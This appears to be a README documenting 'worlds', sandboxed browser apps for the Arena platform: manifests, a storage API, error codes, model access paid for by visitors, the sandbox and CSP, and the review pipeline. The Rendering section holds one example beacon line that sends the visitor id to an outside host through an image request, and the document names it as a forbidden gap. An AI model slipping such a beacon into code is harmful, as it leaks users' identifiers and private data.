# Worlds

The second kind of artifact this repo publishes, beside `games/`.

The difference is not size or ambition, it is **money**:

|            | `games/`                                   | `worlds/`                                  |
| ---------- | ------------------------------------------ | ------------------------------------------ |
| Output     | a `score` → rank → credits                 | nothing scored                             |
| Runs where | backend `isolated-vm` (authoritative)      | the visitor's browser, sandboxed           |
| Determinism | enforced (no clock, no entropy)           | not required                               |
| Gated on   | determinism, termination, source scan      | self-contained build, storage caps, schema |
| Threat     | cheating for real money                    | UGC abuse                                  |

With nothing to cheat *for*, the whole authoritative-simulation apparatus is
unnecessary. A world is author code in the same locked-down sandbox a game's T2
view already uses.

## Try it locally

```bash
pnpm install
pnpm new-world my-world "My World"     # scaffolds a working, publishable world
pnpm preview-world my-world            # opens it exactly as Arena runs it
pnpm validate                          # the CI gate
```

`preview-world` is not an approximation of the host. It speaks the same protocol,
loads the document the same way (`iframe sandbox="allow-scripts"` + `srcdoc` +
injected CSP), and enforces the same rules — schema, ownership, size, uniqueness,
per-author quota. Storage is in-memory instead of Postgres; that is the only
difference that matters. Switch identity in the top bar to see another visitor's
view of the same world.

Enforcing the rules locally is the point: `quota`, `conflict` and `unique` are
ordinary outcomes in a shared world, and an author who first meets them in
production meets them as a bug report.

## Anatomy

```
worlds/<slug>/
├── world.manifest.json   # type, storage, presentation — the reviewed contract
├── src/world.ts          # export default defineWorld({ meta, mount })
├── assets/               # optional; inlined as data: URIs at build time
├── cover.svg             # home-page card — 800x350 (16:7); see AGENTS.md "The cover"
└── about.md              # shown on the card and the world's page
```

`storage` is optional. Omit the block entirely and the world is **read-only**:
nothing is stored, no write endpoint exists, and there is correspondingly nothing
to schema-validate or cap. A world that is a place to look at rather than write in
is a legitimate world.

`credits` is optional too — `{ author?, basedOn? }`, both plain text with an
optional (`basedOn`: required) `https://` link. It is manifest metadata rather
than something a world draws, because the document is sandboxed without
`allow-popups` and cannot navigate the top frame: a link rendered inside the
world does nothing when clicked. Arena renders it in its own chrome and shows the
target hostname beside the author-chosen name, so `name: "Google"` pointing
elsewhere is visible before the click. CI rejects non-https URLs and embedded
credentials; the backend registry re-checks and silently drops a bad link rather
than delisting a live world over it.

### Worlds to read first

| World | Shows |
|-------|-------|
| [`worlds/guestbook`](../worlds/guestbook) | The minimal shape — one editable note per visitor, plus an append-only `echoes` collection with `unique [author.id, payload.target]` |
| [`worlds/drift-bottle`](../worlds/drift-bottle) | Bottles + replies; bilingual via `ctx.lang`; audio |
| [`worlds/celestial-atlas`](../worlds/celestial-atlas) | Boundless canvas — `indexes` on `payload.x`/`payload.y` for spatial queries; `owner` writes plus a `none` (append-only) reaction collection |

## Persistence is a container, not a domain model

The platform stores records with generic CRUD and knows nothing about what a
record *means*. `payload` is author-shaped JSON, validated only against the JSON
Schema declared in the manifest.

The consequence worth internalising: **domain features are not platform
features.** "Other visitors can light up my planet" is not a `reactions` API — it
is a second collection whose records hold a target id:

```jsonc
"collections": {
  "planets": { "write": "owner", "maxRecordsPerAuthor": 1, "indexes": ["payload.x", "payload.y"] },
  "lamps":   { "write": "none",  "indexes": ["payload.target"],
               "unique": [["author.id", "payload.target"]] }
}
```

`unique` gives you "one lamp per visitor per planet", enforced by the platform,
which still has no idea what a lamp is.

The platform owns only what cannot be delegated safely: identity, ownership,
schema validation, size caps, uniqueness, quota, rate limits, pagination,
moderation state, and concurrency versions.

### `indexes` — why queryable fields must be declared

`payload` is opaque, but a boundless world still has to answer "give me the
records near these coordinates". A jsonb index would be built for one specific
field *name*, so every world whose field is called something else would need
another database migration — and world authors have no database access.

So the manifest declares paths, and the platform copies those values, in order,
into a fixed set of pre-created index slots. One set of indexes, created once,
serves every world. Undeclared paths are simply not queryable.

### Failure is an ordinary outcome

Every collection method rejects with a `WorldError` carrying a `code`. In a shared
world these are not exceptional — they are what a second person being there looks
like:

| code | means |
|------|-------|
| `conflict` | someone wrote first; your `version` was stale — re-read and retry |
| `quota` | `maxRecordsPerAuthor` or the world's total-record ceiling is exhausted |
| `rate-limited` | slow down; honour `retryAfterSec` |
| `unique` | violates a declared `unique` constraint |
| `unauthenticated` | anonymous visitor, and this collection needs an identity to write |
| `forbidden` | not the owner, or the collection is append-only |
| `invalid` / `too-large` | failed the declared schema / exceeded `maxRecordBytes` |
| `not-found` / `moderated` | absent, or hidden by moderation |
| `unavailable` | transport or platform failure; retryable |

Handling them is not defensive politeness — a world that lets one of these reach
the visitor as a dead button is a YELLOW at review. Say what happened.

Concurrency is opt-in: pass the record's `version` to `put`/`patch` to make the
write conditional. Without it, last-write-wins and you silently clobber whoever got
there first; with it, you get `conflict` and a chance to merge.

### Schema versions — data outlives code

A world is perpetual. Unlike a match, it accumulates records across releases, so
a renderer must expect payloads older than itself. Bump `schemaVersion` when the
shape changes; keep every version you can still render in
`supportedSchemaVersions`.

CI checks that `supportedSchemaVersions` contains `schemaVersion` — a build must
be able to read back what it writes. It does **not** check the list against
versions already in the store: the gate runs on a PR, with no access to
production data. Dropping a version that real records still use is caught by
review, not by a script, so say so in the PR when you drop one.

## The rest of `ctx`

### `ctx.local` — private per-visitor storage

**`localStorage` does not work in a world.** The document runs in an
`iframe sandbox` without `allow-same-origin`, so its origin is opaque and storage
access throws. `pnpm validate` rejects any use of it, and `ctx.local` is what to
use instead:

```ts
await ctx.local.set('sound', 'on')
const sound = await ctx.local.get<string>('sound')   // null when signed out
await ctx.local.del('sound')
```

It is per visitor, private, and not listable — a preference, not content. Two
things follow from that:

- A signed-out visitor has nowhere to store anything, so **writes fail and reads
  return `null`**. Treat it as best-effort: `void ctx.local.set(k, v).catch(() => {})`.
  Never let a preference decide whether the world opens.
- For a signed-in visitor it follows them across devices, because it lives on the
  platform rather than in one browser.

### `ctx.ai` — a model, paid for by the visitor

Declare it in the manifest, and say what it is for:

```json
"capabilities": {
  "ai": { "purpose": "reads tactical orders and adjusts player policy", "maxTokens": 900 }
}
```

Then call it:

```ts
const reply = await ctx.ai!.chat({
  system: 'You are a football tactics coach. Answer only by calling the tool.',
  messages: [{ role: 'user', content: 'push up, but do not dive under the tower' }],
  tools: [{ name: 'set_tactics', input_schema: { /* JSON Schema */ } }],
})
for (const block of reply.content) {
  if (block.type === 'tool_use') apply(block.input)
}
```

Anthropic Messages shape, non-streaming. `stopReason === 'tool_use'` means the
model is waiting for a result — push a `tool_result` block back and call again.

**The signed-in visitor pays, from their own NetMind account.** Not Arena, and
not you. Everything else here follows from that one fact:

- **Signing in is required.** A signed-out visitor gets `unauthenticated`. That
  is the normal state of a world someone just opened, not a failure.
- **The first call asks permission.** The host page — not the world — shows the
  visitor your `purpose` and asks them to approve spending their credit. They may
  decline, and then every call fails.
- **`ctx.ai` can be `null`**, when the manifest declares nothing or the
  deployment has model access switched off. The type makes you handle it.
- **Spend it like it is someone else's money.** A call inside an animation frame,
  or a tool loop that never terminates, drains a stranger's balance. The platform
  rate-limits per visitor per world, and `rate-limited` is what a runaway loop
  feels like from in here.

So a world **must stay usable with no model at all**. This is not a courtesy —
signed out, declined, rate-limited and switched-off are four ordinary states, and
between them they are most of the ways a visitor meets your world.
`worlds/predictmy` is the worked example: its tactics chat calls a model when it
can, and otherwise falls through to the rule parser the original site shipped, so
the same orders still move the same numbers.

You do not choose the model — Arena does, per deployment — and you never see a
key. What you send is yours: free-form `system`, `messages` and `tools`. That
freedom exists precisely BECAUSE the visitor pays; there is no shared budget for
a prompt to drain.

### `ctx.onVisitor` — identity can change mid-session

`ctx.me` is not fixed. Someone can open a world signed out and sign in without
reloading, and every record's `mine` flag changes when they do:

```ts
ctx.onVisitor((me) => {
  // re-render anything that depends on who is looking
})
```

### `collection.onChange` — what other people are doing

```ts
planets.onChange((e) => {
  if (e.op === 'added') draw(e.record)
  else if (e.op === 'updated') redraw(e.record)
  else remove(e.id)                       // op === 'deleted'
})
```

Handle all three. `deleted` is not only someone removing their own work — it is
also how moderation reaches you, and a world that ignores it keeps drawing
something no one else can see.

Delivery is **best-effort**. The sandbox has `connect-src 'none'`, so a world
cannot subscribe to anything itself; the host polls and forwards. Expect it to
lag, to coalesce, and to miss `deleted` for a collection larger than one page —
past that, an absent record cannot be told apart from one that has simply aged
out of the newest page. `list()` remains the source of truth; `onChange` is how
you avoid re-reading it constantly.

## Language and theme

The platform injects both, and **the world decides whether to use them**.

```ts
ctx.lang               // 'en' | 'zh' | 'ja' | 'ko' | 'es' | 'ru' | 'fr' | 'de' | 'pt'
ctx.theme              // { mode: 'dark' | 'light', bg, surface, fg, fgSubtle, border, accent, accentFg, font }
ctx.onLangChange(cb)   // fires when the visitor changes it in Arena's header
ctx.onThemeChange(cb)
```

`ctx.lang` is always a **base code**, never a full locale. The platform narrows
`zh-CN` to `zh` and falls back to `en` for anything Arena has no strings for, so
a world can switch on the value directly:

```ts
const t = (zh: string, en: string) => (ctx.lang === 'zh' ? zh : en)
```

Getting this wrong is easy in a way that is hard to see: a world that compares
against `'zh-CN'`, or that indexes its own language array by position, will read
one language and render another. Compare codes, never positions.

**If you use these, do not also ship your own switcher.** Two controls for one
setting are two controls that disagree — Arena's header is the one place a
visitor should change either. Hide or omit yours and subscribe instead:

```ts
const applyLang = () => { /* re-render your strings in ctx.lang */ }
applyLang()
ctx.onLangChange(applyLang)
```

**If you ignore them, nothing breaks.** A world with a deliberate palette should
not be repainted by a platform toggle, and a world whose language switcher is
part of its design should keep it. Both are ordinary choices; the platform does
not insist.

One caveat worth knowing when porting an existing page: applying a language is
usually a *function*, not a stored value. Writing your language into storage and
expecting the page to notice will not work — most pages read that once at boot.
Find the function the page's own control calls, and call that.

## Rendering, audio, assets

The document is loaded via `srcdoc` into `sandbox="allow-scripts"` **without**
`allow-same-origin`, so it has an opaque origin and cannot reach the visitor's
session. The CSP sets `connect-src 'none'`: a world cannot open a channel of its
own, and every read and write goes through the host's allowlisted postMessage
proxy, which holds the credential.

`img-src` and `media-src` allow `data:` **and `https:`**, which is looser than the
game-view policy. That is deliberate — a hidden-info game's frame holds a
viewer's secret hand, and a world's records are public co-created content, so
allowing real images and audio costs nothing comparable and is what lets a world
look and sound like itself.

Be exact about the trade, though: `connect-src 'none'` does not cover images, so
`new Image().src = 'https://elsewhere/?' + ctx.me.id` does reach the network. A
world *can* post out the visitor id and whatever it read from `ctx.local`. Nothing
technical stops it — what stops it is that worlds are read before they ship. Don't
do it; a beacon in a reviewed diff is visible, and it is grounds for rejection.

Audio therefore works two ways, both without a network:

- **synthesis** — `OscillatorNode` and friends load no resource at all
- **samples** — put the file in `assets/`, and `ctx.asset('assets/bell.mp3')`
  returns the inlined `data:` URI

`ctx.audio()` resolves only after a real user gesture inside the frame, because a
sandboxed iframe has no inherited activation. Render your own "enable sound"
control, and stay usable if nobody touches it.

## Two gotchas that cost real time

**JSON Schema tuples.** Draft-07 wrote them `items: [a, b, c]`; 2020-12 renamed
that to `prefixItems`. The old spelling is a valid-looking object that only fails
at compile — so a world would ship and then reject every write. `pnpm validate`
compiles every collection schema to catch exactly this.

**One file, always.** The host loads the document through `srcdoc`, whose opaque
origin cannot resolve a relative `import './chunk.js'`. A multi-chunk build
renders a blank frame with no error. The build inlines everything and CI rejects
the rest.

## Publishing

Same pipeline as games: PR → `validate` → AI review → CODEOWNERS review → merge →
`build:bundles` → GitHub Release. Worlds ride in the same `index.json` under
`worlds[]`, pinned by content hash, and the Arena backend picks them up on its next
refresh without a restart. A published world appears on the Arena home page
automatically — no frontend change is needed to ship one.

Because the document, its cover and its assets are all inlined into that single
`index.json` — which the backend holds in memory — both the built document and the
cover have byte caps. `pnpm validate` reports the actual number against the limit,
so you find out locally rather than in CI.

The AI reviewer grades worlds against a **different rubric than games**: it does not
check determinism (a world has no score to rig), and instead looks for sandbox
escape, exfiltration through a remote URL, protocol subversion, phishing UI, and
storage abuse. The single most common blocking finding is rendering another
visitor's stored text with `innerHTML` instead of `textContent`. The full rubric is
in [release-flow.md](release-flow.md).

Submission PRs may only touch `games/` or `worlds/`. A world's document runs in a
visitor's browser, so an author who could also edit the CSP or the op allowlist
in the same PR would be editing their own sandbox.
